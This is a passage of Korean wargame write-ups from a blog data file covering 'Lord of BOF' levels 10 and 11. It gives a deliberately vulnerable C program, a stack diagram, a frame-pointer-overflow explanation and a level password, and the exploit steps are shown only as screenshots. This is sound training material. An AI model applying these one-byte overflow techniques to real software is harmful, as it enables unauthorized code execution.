이름을 가진 디렉토리를 생성하고 실행파일 skeleton을 복사하여 위와 같은 실험을 반복하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.727272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAiklEQVR42iWLCw6DMAxDOcGalP4oUKb1M5JQ7n+8qcyyrCfLntZti0sI3ulZ72k3xjjvnHOzmZclWGvjGlNKMcbjfXgfXkopBQCgAKZWa/u2WkoptbVWS82fXIdayZmImYVYiAYSy9W7XNLvLv2ehPkSGRMROklY+Dmc52hCCACAGgERUQPi3/jkD3rJFZwl0zLSAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/930729abcceb5e79a34d2d9015333518/c9b55/4.webp 165w,\n/static/930729abcceb5e79a34d2d9015333518/f2908/4.webp 330w,\n/static/930729abcceb5e79a34d2d9015333518/cc661/4.webp 660w,\n/static/930729abcceb5e79a34d2d9015333518/be082/4.webp 666w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/930729abcceb5e79a34d2d9015333518/04c57/4.png 165w,\n/static/930729abcceb5e79a34d2d9015333518/d9ecf/4.png 330w,\n/static/930729abcceb5e79a34d2d9015333518/1f083/4.png 660w,\n/static/930729abcceb5e79a34d2d9015333518/ace37/4.png 666w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/930729abcceb5e79a34d2d9015333518/1f083/4.png\"\n            alt=\"mkdir\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 492px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAiElEQVR42jWOQQ6DMAwEba+dCyJIgEIgTkl7If3/BytadQ57Ga00dLa2H0eMIxGpaozRTKFqpj8A3KsaQhCI6i3MgpnR9e5X72ldiUhE0rZ5Le356v0q7ssy55xTSvOy1kc9z+bFvdY95ziOVNz3ckxTvM/AMAzMHIIBEAEA+zYwCzPrH2Emog9q9gjsfdG33AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ac5da69f634c35b6477e4be1564ac408/c9b55/5.webp 165w,\n/static/ac5da69f634c35b6477e4be1564ac408/f2908/5.webp 330w,\n/static/ac5da69f634c35b6477e4be1564ac408/9d6da/5.webp 492w\"\n              sizes=\"(max-width: 492px) 100vw, 492px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ac5da69f634c35b6477e4be1564ac408/04c57/5.png 165w,\n/static/ac5da69f634c35b6477e4be1564ac408/d9ecf/5.png 330w,\n/static/ac5da69f634c35b6477e4be1564ac408/5c6e9/5.png 492w\"\n            sizes=\"(max-width: 492px) 100vw, 492px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ac5da69f634c35b6477e4be1564ac408/5c6e9/5.png\"\n            alt=\"mem: argv[0]\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>동일하게 메모리 끝쪽에 argv[0]이 남아있는 것을 발견하였다. 이것을 이용하여 다음과 같은 익스플로잇을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.09090909090909%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1UlEQVR42o2OS27DMAxEZTl1/UmlRI7Fn0h31ZPYZzB8/4sUShZdFAU6Gw5IPnKcmYmIqRJR0UKEqpoBmBkRcs7MLCKIAAAsnPNCiGmez/N0wixFRLhoLRU2JWIAQEJmJmYiIn6eZgaEUiTG23EczsxU1VQBoJSSl8eSF6njMAxDiMF73zSNb3w11TZvl4tzbt93t66fiDUUItpqMYYQQppTW5d927bul17NbdtcXpfpYxrHMaV0T/eu66bp+t517m/9wPPXI15jvMX6m6Dv+xBq4P/A3wR1GLNDhfpgAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9a491e7465642f8566347ff6686f8887/c9b55/6.webp 165w,\n/static/9a491e7465642f8566347ff6686f8887/f2908/6.webp 330w,\n/static/9a491e7465642f8566347ff6686f8887/cc661/6.webp 660w,\n/static/9a491e7465642f8566347ff6686f8887/ced6d/6.webp 665w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9a491e7465642f8566347ff6686f8887/04c57/6.png 165w,\n/static/9a491e7465642f8566347ff6686f8887/d9ecf/6.png 330w,\n/static/9a491e7465642f8566347ff6686f8887/1f083/6.png 660w,\n/static/9a491e7465642f8566347ff6686f8887/5f4af/6.png 665w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9a491e7465642f8566347ff6686f8887/1f083/6.png\"\n            alt=\"mkdir ln\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.81818181818182%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAcUlEQVR42pXNUQrDMAwD0MAiyU0DZYU5geS7u/8NR53tAHsfRsIGJ3fvvR/HIYmkbQZAkoUM3DOQJChpZUmptfY8T5I5P7iIQAawGu5V5g9CfEK6rveY8+VeSlEo+wpmpi18i7SyZOsmjTla81pr+t8H4rEG9yxk1iEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c16e25ae28c9799ad0d42121cb6b0377/c9b55/7.webp 165w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/f2908/7.webp 330w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/cc661/7.webp 660w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/c2945/7.webp 664w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c16e25ae28c9799ad0d42121cb6b0377/04c57/7.png 165w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/d9ecf/7.png 330w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/1f083/7.png 660w,\n/static/c16e25ae28c9799ad0d42121cb6b0377/31493/7.png 664w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c16e25ae28c9799ad0d42121cb6b0377/1f083/7.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: shellcoder</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"d1570ba2-13f5-55a8-923f-88a3e6a96c6b","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-10/","title":"LOB 10번 (vampire -> skeleton)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/d4ec033e988120e831a4098214b1e92b/972a9/0.png","srcSet":"/static/d4ec033e988120e831a4098214b1e92b/8ade6/0.png 123w,\n/static/d4ec033e988120e831a4098214b1e92b/0b8a8/0.png 247w,\n/static/d4ec033e988120e831a4098214b1e92b/972a9/0.png 493w","sizes":"(min-width: 493px) 493px, 100vw"},"sources":[{"srcSet":"/static/d4ec033e988120e831a4098214b1e92b/b7020/0.webp 123w,\n/static/d4ec033e988120e831a4098214b1e92b/086cd/0.webp 247w,\n/static/d4ec033e988120e831a4098214b1e92b/c5d55/0.webp 493w","type":"image/webp","sizes":"(min-width: 493px) 493px, 100vw"}]},"width":660,"height":400.2839756592292}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - darkknight\r\n        - FPO\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">problem_child</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">problem_child</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[40] |\r\n| [problem_child] SFP |\r\n| [problem_child] RET |\r\n| [main] SFP  |\r\n| [main] RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>힌트로 FPO를 주었다. FPO는 Frame Pointer Overflow의 약자로, fake ebp의 일종이다. 여태까지 공격한 것들을 보면 return address 이후로는 손을 댈 수 없는 것이 원칙이었으나, fake ebp기법을 활용해 ebp의 위치를 옮기면 공격자가 원하는 위치에서 원하는 return address를 추출하는 것이 가능하다.</p>\n<p>problem_child 함수를 보면 strncpy(buffer, src, 41) 함수가 존재하는데, 이 함수에는 원래는 40bytes인 buffer의 1byte를 오버플로우 시킬 수 있는 취약점이 존재한다. 즉 problem_child 함수의 SFP의 1byte를 수정시킬 수 있는 점을 보고 FPO라는 공격기법을 힌트로 준 것으로 보인다. 아래는 이를 시도한 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 493px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAByklEQVR42nWS247bMAwFY4uyJSciFce6kJTs/P9XFnHT7maL8pHAwXAOeMk5xRiZOaWUS04pbem1md3svQcA52Y3z9M0Oeemebp8n95bLiWl7XjuolJKFuH1sTrviLD1jhh678I1BHTOfYRbUxZGROaiqrnkWuuWsgVjJ5tyGoch51xf+7Is/pP8Cst9vatK33cWFmFRnefJWqtNAcyWtn3vhBhuN2thuAzDcIZVlVVjJOYqqjnnUksudZ5na23lasGs21ZrxnC7Xq8hhD/R82x5haM22d9kKcxICACiai3kUlgkICIhES7LEmO01l70dKZPcsoFMYAxLDJNdkup1nK9Xr33iCFgcM4Nl+HSujJLvMd2kuUks8grDMCixoxbSq2143kQ4e12I6LFL29n+ce5cEUMxphcijHjI22l1vt6R6IYafGeYpys/e0sFOk7WVQRgwU4nk/v3JaSqkSK3rtxHC3AV2H1rEf+kkupLJHIjGNhBgsp5/3Yj+czEiIGIjJgvtq+P1ZV7ieZXwISwtvZe2+tdc4ty2LM+PM9tfez7dJ6Tzkxs7QWIwFAqQWMufxvHo/1VNLe25ZSPzoRzvMMAOM4/nzmz/kFaAczAUbYeO0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d4ec033e988120e831a4098214b1e92b/c9b55/0.webp 165w,\n/static/d4ec033e988120e831a4098214b1e92b/f2908/0.webp 330w,\n/static/d4ec033e988120e831a4098214b1e92b/4efd5/0.webp 493w\"\n              sizes=\"(max-width: 493px) 100vw, 493px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d4ec033e988120e831a4098214b1e92b/04c57/0.png 165w,\n/static/d4ec033e988120e831a4098214b1e92b/d9ecf/0.png 330w,\n/static/d4ec033e988120e831a4098214b1e92b/f88d0/0.png 493w\"\n            sizes=\"(max-width: 493px) 100vw, 493px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d4ec033e988120e831a4098214b1e92b/f88d0/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>bp를 problem_child가 종료되기 직전인 0x8048469(leave)에 걸고 buffer에 41바이트를 채워넣어 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 591px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.242424242424242%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAoklEQVR42o3PwY7DIAwE0AAbAybYcWggNvn/71y1ao+76pNGcxzNonq1dvTRzUxEKtFPCN655RvHIfvOvZ+Vqoioqoic55lzSikhPgtgzTmFEAAgxphevPfLGMNM7Rkdo8/7VlWb8xpDbapeIkK1VqoAgIgxwrquAOCcW1przFxKISZiKgUR874zETHTe+Ev8546bdtKRmyPdrQGAP7D/Xv+F6wWC5BnU6LdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a723dfc191ff7a9e367aa98c52a2ee01/c9b55/1.webp 165w,\n/static/a723dfc191ff7a9e367aa98c52a2ee01/f2908/1.webp 330w,\n/static/a723dfc191ff7a9e367aa98c52a2ee01/48c21/1.webp 591w\"\n              sizes=\"(max-width: 591px) 100vw, 591px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a723dfc191ff7a9e367aa98c52a2ee01/04c57/1.png 165w,\n/static/a723dfc191ff7a9e367aa98c52a2ee01/d9ecf/1.png 330w,\n/static/a723dfc191ff7a9e367aa98c52a2ee01/e4c9a/1.png 591w\"\n            sizes=\"(max-width: 591px) 100vw, 591px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a723dfc191ff7a9e367aa98c52a2ee01/e4c9a/1.png\"\n            alt=\"memory1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 596px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAh0lEQVR42h2LUQ7DIAzFHmUdHWmQBoMmgZbd/5RT509bhprl/C4lX3NaN6LonFvcwok5JaIdgPeemTkxEQFY1/WunGDdti0AaEcVFVHxf9RUTWutAJ7hqartkJwzgEhRVFtruOaM9HLO2ei3EvHL4h++j6Fmtd1z2MI4h5iVTwFA+z6/s5/nD4oFCpafzHd7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c965a6fb47be64b9cd02997a3fc80837/c9b55/2.webp 165w,\n/static/c965a6fb47be64b9cd02997a3fc80837/f2908/2.webp 330w,\n/static/c965a6fb47be64b9cd02997a3fc80837/3cb93/2.webp 596w\"\n              sizes=\"(max-width: 596px) 100vw, 596px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c965a6fb47be64b9cd02997a3fc80837/04c57/2.png 165w,\n/static/c965a6fb47be64b9cd02997a3fc80837/d9ecf/2.png 330w,\n/static/c965a6fb47be64b9cd02997a3fc80837/699b7/2.png 596w\"\n            sizes=\"(max-width: 596px) 100vw, 596px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c965a6fb47be64b9cd02997a3fc80837/699b7/2.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ebp의 한 바이트가 덮여있는 것을 볼 수 있다. 또한 ebp가 한 바이트가 덮여있는 SFP 주소지인 0xbffffa41을 가리키고 있는 것을 볼 수 있다. 본래 buffer의 크기만큼 채워 보았을 때 ebp가 어떠한지도 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 594px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.181818181818183%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAjklEQVR42nXLwQ7DIAwDUGDQNIFAqJaUTXT//5lTuffJ8sGS3RjjOPr1u8xMROY1zWzOaaZI2FpjZtgBEXOmGCMi7rgTUc7Z2aKqava+y85x3tO5YgoAMcYtpS2lEEJa4uLMtHdh5lqriJRSiIgrS5fChZlTSu7J+H7UtLUGALXV1oWIvPfhdfPBe++fzn9VmgpP1nC1vAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7f4cbfc0bbeff4093e11167f16874f04/c9b55/3.webp 165w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/f2908/3.webp 330w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/bc223/3.webp 594w\"\n              sizes=\"(max-width: 594px) 100vw, 594px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7f4cbfc0bbeff4093e11167f16874f04/04c57/3.png 165w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/d9ecf/3.png 330w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/5fd3e/3.png 594w\"\n            sizes=\"(max-width: 594px) 100vw, 594px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7f4cbfc0bbeff4093e11167f16874f04/5fd3e/3.png\"\n            alt=\"memory3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이로써 ebp의 한 바이트를 조작할 수 있음을 확인하였다. 이제 0xbfffa00 ~ 0xbfffaff 범위에 쉘코드를 넣고 이 범위에 맞추어서 problem_child의 ebp를 조작하면 된다. strncpy 직후인 problem_child+21에 bp를 걸고 buffer의 위치를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 594px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.181818181818183%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAjklEQVR42nXLwQ7DIAwDUGDQNIFAqJaUTXT//5lTuffJ8sGS3RjjOPr1u8xMROY1zWzOaaZI2FpjZtgBEXOmGCMi7rgTUc7Z2aKqava+y85x3tO5YgoAMcYtpS2lEEJa4uLMtHdh5lqriJRSiIgrS5fChZlTSu7J+H7UtLUGALXV1oWIvPfhdfPBe++fzn9VmgpP1nC1vAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7f4cbfc0bbeff4093e11167f16874f04/c9b55/3.webp 165w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/f2908/3.webp 330w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/bc223/3.webp 594w\"\n              sizes=\"(max-width: 594px) 100vw, 594px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7f4cbfc0bbeff4093e11167f16874f04/04c57/3.png 165w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/d9ecf/3.png 330w,\n/static/7f4cbfc0bbeff4093e11167f16874f04/5fd3e/3.png 594w\"\n            sizes=\"(max-width: 594px) 100vw, 594px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7f4cbfc0bbeff4093e11167f16874f04/5fd3e/3.png\"\n            alt=\"memory4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.09090909090909%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA30lEQVR42o3PW7LDIAiAYYoRosZLYsRWTZv9r/JMXMH5XuDlHwZo7ZNzllqk1jFG6530gojwH/nYQwhSTu99iPEsZ0rpyMfKD+vsnGSMUYuaOxtjmPmJnXN2cttmnXWb25wLMTpnt4mZtF6ICBGJiJjU9MTXNT6tpRRFZD/2GKMxq7Um7THtyawrAChErTWRfk16evr7/n1/96KUtfb6Xn10YwwA9NE/reWcn9fO3EbvvSuliLj31q/LBw/vd5VaFSIzz+MHMwG8ipQiEmMEAB/8WcpZCiIuixYpItU6+wdrRBAxkYOEuAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3594f855e32a0ef14f388b7511e243b5/c9b55/4.webp 165w,\n/static/3594f855e32a0ef14f388b7511e243b5/f2908/4.webp 330w,\n/static/3594f855e32a0ef14f388b7511e243b5/83245/4.webp 598w\"\n              sizes=\"(max-width: 598px) 100vw, 598px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3594f855e32a0ef14f388b7511e243b5/04c57/4.png 165w,\n/static/3594f855e32a0ef14f388b7511e243b5/d9ecf/4.png 330w,\n/static/3594f855e32a0ef14f388b7511e243b5/0c69d/4.png 598w\"\n            sizes=\"(max-width: 598px) 100vw, 598px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3594f855e32a0ef14f388b7511e243b5/0c69d/4.png\"\n            alt=\"memory5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 445px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 93.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACcklEQVR42n2T6Y6kMAyEYSD3fSdOgN73f8lV0r3S7mi0JQS/bMqfyxv0HlMIMTrvY04xRkIIQug8DkIJoYRSep7n9qMatBB8SqmPEWLIJTeAXHKt5X7u677v16O1UlpzzoUUQnBrrbGWMballHLJ3vsYQx8DAKy1tZbrvvq4vPfH8XWeJ6UUY0QowQgRQiijGOMtpgAdYgxKqVLy9Tz368mlWGvv5zZGI4S54JiQ+WCMCSaUfGynlKD3EGNr7Xnu3ruxhlLGORNCSDmNGjNNMkYF55RRztmn2HsPvRlrYoy11ZiylJIxpuabamNiDM45qeQPwPro0CczvMQ5k1JyzpVShFCE0L7vX0vbtu37qtn/FI8xSsm55BBCnwKllFwilJznsf1HvY8YQ8q5Ls4+xlKyNUZr1VqDDuO6JjA8l48QwghTRsniN4HFlZBaax8XADjvGrR7rqqXUpSSlFJjLRdCaS2lsNaquXm1xRgbQIhB6bWq+24dUkrWuusaanE6juPra87+Hn/f9++rmjMP6KOnnIUQSskQgtZaCOG8f1PQeuLQRu9Lm/N+psq5PvrzeqB3xhghRHCOCZZSOueMtUKIRXv/B1iptZR8nudEgfG8AzqTND+USCk455QyhNDPh+GdDWtyo/Uk16oP3jsHALVV6J1zxjhffaekknz25G/ayYdQaoHeG4Bztra6wjPJvW9ACEEo5bPNSpHgc5Cc87iulKLWCqC+fr2u+84lO++f57bGHMfxPum/9bG9It2c9z6EBq3U6r1f7YUxZv1EzGyLqWVYKKU+xca61qqxtne4rgs6fGgLTghRWjlvtfnQ/qbfDh47weHvOK8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3eb56ffcbb915eb93f93fbac6a477d5d/c9b55/5.webp 165w,\n/static/3eb56ffcbb915eb93f93fbac6a477d5d/f2908/5.webp 330w,\n/static/3eb56ffcbb915eb93f93fbac6a477d5d/75680/5.webp 445w\"\n              sizes=\"(max-width: 445px) 100vw, 445px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3eb56ffcbb915eb93f93fbac6a477d5d/04c57/5.png 165w,\n/static/3eb56ffcbb915eb93f93fbac6a477d5d/d9ecf/5.png 330w,\n/static/3eb56ffcbb915eb93f93fbac6a477d5d/e66bf/5.png 445w\"\n            sizes=\"(max-width: 445px) 100vw, 445px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            